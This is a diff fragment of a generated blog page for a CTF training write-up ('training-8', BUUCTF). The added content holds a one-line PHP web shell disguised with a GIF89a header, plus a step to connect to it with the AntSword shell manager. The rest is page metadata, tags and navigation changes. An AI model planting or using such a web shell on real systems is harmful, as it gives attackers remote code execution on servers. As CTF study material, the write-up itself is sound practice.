+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>蚁剑连接</p>
+</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202312052244559.bmp"
+                      alt="capture_20231205222852913"
+                ></p>
 
         </div>
 
@@ -456,18 +600,18 @@
             <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> 文件包含</li>
+        <li><strong>Title:</strong> training-8</li>
         <li><strong>Author:</strong> dawn_r1sing</li>
         <li><strong>Created at
-                :</strong> 2023-11-16 22:45:44</li>
+                :</strong> 2024-04-07 10:56:44</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-11-16 22:52:41
+                    :</strong> 2024-04-07 10:56:33
             </li>
         
         <li>
-            <strong>Link:</strong> https://dawnrisingdong.github.io/2023/11/16/文件包含/
+            <strong>Link:</strong> https://dawnrisingdong.github.io/2024/04/07/training-8/
         </li>
         <li>
             <strong>
@@ -493,11 +637,11 @@
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/web/">#web</a>&nbsp;
+                        <a href="/tags/%E9%9B%86%E8%AE%AD/">#集训</a>&nbsp;
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/%E4%B8%93%E9%A2%98/">#专题</a>&nbsp;
+                        <a href="/tags/web/">#web</a>&nbsp;
                     </li>
                 
             </ul>
@@ -511,13 +655,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/04/07/training-8/"
+                        href="/2024/04/07/unzip/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">training-8</span>
+                                <span class="post-nav-title-item">unzip</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -527,10 +671,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2023/11/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                        href="/2023/11/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">反序列化</span>
+                                <span class="post-nav-title-item">文件包含</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -590,8 +734,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">文件包含</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%9F%BA%E6%9C%AC%E5%86%85%E5%AE%B9"><span class="nav-text">1、基本内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E6%A3%80%E9%AA%8C%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">2、检验漏洞是否存在</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-text">3、攻击方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95"><span class="nav-text">3、基本方法</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">training-8</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF"><span class="nav-text">BUUCTF</span></a></li></ol>
 
     </div>
 </div>
